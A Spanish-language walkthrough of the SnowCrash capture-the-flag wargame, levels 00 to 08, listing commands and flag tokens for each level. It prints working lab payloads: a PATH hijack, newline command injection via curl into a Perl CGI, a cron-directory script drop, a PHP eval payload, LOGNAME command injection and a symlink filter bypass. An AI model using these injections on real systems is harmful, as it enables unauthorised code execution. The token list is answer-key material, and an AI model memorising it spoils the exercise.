## Level 00

Para encontrar el siguiente nivel he hecho un find / -user flag00 2>/dev/null
conel que me salen los siguientes ficheros

/usr/sbin/john

/rofs/usr/sbin/john

que al ejecutar

strings /usr/sbin/john

aparece el código cdiiddwpgswtgt

Al código hay que pasarle un rot13.-ver rot13.c- y el resultado es nottoohardhere
El Token es:
x24ti5gi3x0ol2eh4esiuxias

## Level 01

El password se encuentra en el fichero /etc/passwd

Es 42hDRfypTqqnw pero está cifrado.

El descifrado lo he hecho en la p'agina WEB https://app.onlinehashcrack.com/
Con el descifrado he obtenido la palabra --> password.
El Token es: f2av5il02puano7naaf6adaaf

## Level 02
Hay que extraer el fichero de la máquina virtual.
para extraerlo he usado:
En mi PC 
nc -l -p 1234 > level02_recibido.pcap
En la máquina virtual
nc 192.168.1.72 1234 < level02.pcap 

EL fichero que aparece en el directorio en el que estás es level02_recibido.pcap

Ejecutando 
tshark -r level02_recibido.pcap -z "follow,tcp,hex,0"

obtenemos el passowrd. 

Tambien podrñiamos habelo obtenido com 
strings -a level02.pcap | grep -A 20 "Password:"

el token flag02 es : kooda2puivaav1idi4f57q8iq

## Level 03192.168

Para vere el código fuente tenemos

objdump -d -M intel nombre_del_programa | less

en la línea de comando 

 80484f7:       c7 04 24 e0 85 04 08    mov    DWORD PTR [esp],0x80485e0
 80484fe:       e8 ad fe ff ff          call   80483b0 <system@plt>

Se llama a la función system con el argumento que hay en el puntero 0x80485e0.

con GDB podemos extraer la cadena de texto que hay en esta dirección;

gdb -batch -ex "x/s 0x80485e0" ./level03

resutlando ser:
/usr/bin/env echo Exploit me

vemos que llama a la función echo sin el path completo usaldo la variable de entorno PATH. Si creamos una función llamada echo y en el path añadimos la nuestro folder, entoncees ejecutará primero nuestra función:
Con vim, creamos un fichero en la carpeta "/var/crash/" que se llama echo que lleve:
#!/bin/bash
/bin/getflag

Y segidamente añadimos al path;

export PATH=/var/crash:$PATH

Al ejecutar ./level03 obtenemos:

Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

## level 04

el token se obtiene directamente inyectando 
curl 'http://192.168.40.43:4747/level04.pl?x=hola%0agetflag'
hola
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

el %0a es un salto de linea que hace qeu se ejecute getflag despues de echo como si fuese una nueva instrucción.

## level 05

level05@SnowCrash:~$ find / -name level05 2>/dev/null 
/var/mail/level05
/rofs/var/mail/level05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

Esto suena a ser un crontab

el fichero /usr/sbin/openarenaserver tiene lo siguiente dentro:
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

esto significa que ejecutará cualquier fichero que se encuentre en la carpeta /opt/openarenaserver/*

creo un shell que ejecute getflag:

level05@SnowCrash:/var/crash$ cat getflag.sh 
#!/bin/bash
/rofs/bin/getflag > /var/crash/flag05

Y en el ichero flag05 aparece
Check flag.Here is your token : viuaaale9huek52boumoomioc

## Level 06
En level 6 encontramos un fichero PHP y un ejecutable.
Cuando ejecutamos 
objdump -d -M Intel level06

vemos emn main una serie de instrucciones:
08048450 <main>:
...
 80484f9:	50                   	push   %eax
 80484fa:	68 d5 87 04 08       	push   $0x80487d5
 80484ff:	c7 45 d4 d5 87 04 08 	movl   $0x80487d5,-0x2c(%ebp)
 8048506:	c7 45 d8 e2 87 04 08 	movl   $0x80487e2,-0x28(%ebp)
 804850d:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
 8048514:	e8 17 ff ff ff       	call   8048430 <execve@plt>

Veamos que hay en las posiciones $0x80487d5 y $0x80487e2:
level06@SnowCrash:~$ gdb -batch -ex "x/s 0x80487d5" ./level06
0x80487d5:	 "/usr/bin/php"
level06@SnowCrash:~$ gdb -batch -ex "x/s 0x80487e2" ./level06
0x80487e2:	 "/home/user/level06/level06.php"

Hay que crear un fichero que contenga dentro el siguiente texto:
[x ${'getflag'}]

Luego hay que ejecutar
./level06 [nombre del fichero]

se imprime el token wiok45aaoguiboiki2tuin6ub

## Level 07

ejecutando strings level07 obtenemos :
...
LOGNAME
/bin/echo %s 
...

con objdump -d -M Intel level07

se obtiene: 
08048400 <getenv@plt>:
 8048400:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048406:	68 18 00 00 00       	push   $0x18
 804840b:	e9 b0 ff ff ff       	jmp    80483c0 <_init+0x3c>

 08048440 <asprintf@plt>:
 8048440:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 8048446:	68 38 00 00 00       	push   $0x38
 804844b:	e9 70 ff ff ff       	jmp    80483c0 <_init+0x3c>

en el primero asumoq ue se recibe la variable env LOGNAME
cambio la variable LOGNAME por :
export LOGNAME = ";getflag"

Al ejecutar ./level07 tecibo 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

## Level08

aparecen 2 ficheros level08 (ejecutable) y token
Al decompilar level08 aparece:

int main(int argc, char** argv, char** envp)
{...
si no hay argumento
    if(argc == 1) {
        _v1072 =  *_v1048;
         *__esp = "%s [file to read]\n";
        printf();
         *__esp = 1;
        exit();
    }
### Si el fichero tiene la palabra token salir
    _t40 = _v1048[1];
    _v1072 = "token";
     *__esp = _t40;
    strstr();
### Si no tienes acceso salir
    if(_t40 != 0) {
        _v1072 = _v1048[1];
         *__esp = "You may not access '%s'\n";
        printf();
         *__esp = 1;
        exit();
    }
### Si no se puede abrir salir
    _t43 = _v1048[1];
    _v1072 = 0;
     *__esp = _t43;
    open();
    _v1040 = _t43;
    if(_v1040 == -1) {
        _v1068 = _v1048[1];
        _v1072 = "Unable to open %s";
         *__esp = 1;
        L08048440();
    }
### Si no se puede leer salir
    _v1068 = 1024;
    _v1072 =  &_v1032;
    _t45 = _v1040;
     *__esp = _t45;
    read();
    _v1036 = _t45;
    if(_v1036 == -1) {
        _v1068 = _v1040;
        _v1072 = "Unable to read fd %d";
         *__esp = 1;
        L08048440();
    }
### En caso comprario imprime
    _v1068 = _v1036;
    _v1072 =  &_v1032;
     *__esp = 1;
    write();
    if((_v8 ^  *gs:0x14]) != 0) {
        __stack_chk_fail();
        return  &_v1032;
    }
    return  &_v1032;
}

Solucion: hacer un link que lleva a token. En nuestro caso
ln -s 

ln -s /home/user/level08/token /var/crash/mitk

ejecutando luego ./level08 /var/crash/mitk obtenemos el token

quif5eloekouj29ke0vouxean
